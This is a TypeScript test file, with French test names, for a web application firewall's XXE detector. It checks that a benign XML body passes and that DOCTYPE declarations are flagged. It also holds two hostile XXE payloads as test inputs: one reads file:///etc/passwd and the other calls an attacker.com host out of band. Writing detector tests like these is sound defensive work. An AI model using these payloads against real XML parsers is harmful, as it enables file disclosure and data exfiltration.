import { WAF } from "../../../src/core/waf";
import { xxeDetector } from "../../../src/detectors/http/xxe.detector";

describe("XXE Detector", () => {
  it("ne déclenche rien sur une requête normale", async () => {
    const waf = new WAF();
    waf.registerDetector(xxeDetector);

    await waf.init();

    const decision = await waf.evaluate({
      method: "POST",
      url: "/upload",
      headers: { host: "example.com" },
      body: "<note><to>Tove</to></note>",
    });

    expect(decision.findings.length).toBe(0);
  });

  it("détecte une déclaration DOCTYPE", async () => {
    const waf = new WAF();
    waf.registerDetector(xxeDetector);

    await waf.init();

    const decision = await waf.evaluate({
      method: "POST",
      url: "/xml",
      headers: { host: "example.com" },
      body: "<!DOCTYPE foo>",
    });

    expect(decision.findings.length).toBeGreaterThanOrEqual(1);
  });

  it("détecte une entité externe SYSTEM", async () => {
    const waf = new WAF();
    waf.registerDetector(xxeDetector);

    await waf.init();

    const decision = await waf.evaluate({
      method: "POST",
      url: "/xml",
      headers: { host: "example.com" },
      body: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`,
    });

    expect(decision.findings.length).toBeGreaterThanOrEqual(1);
  });

  it("détecte une tentative d'XXE OOB", async () => {
    const waf = new WAF();
    waf.registerDetector(xxeDetector);

    await waf.init();

    const decision = await waf.evaluate({
      method: "POST",
      url: "/xml",
      headers: { host: "example.com" },
      body: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/evil"> ]>`,
    });

    expect(decision.findings.length).toBeGreaterThanOrEqual(1);
  });
});
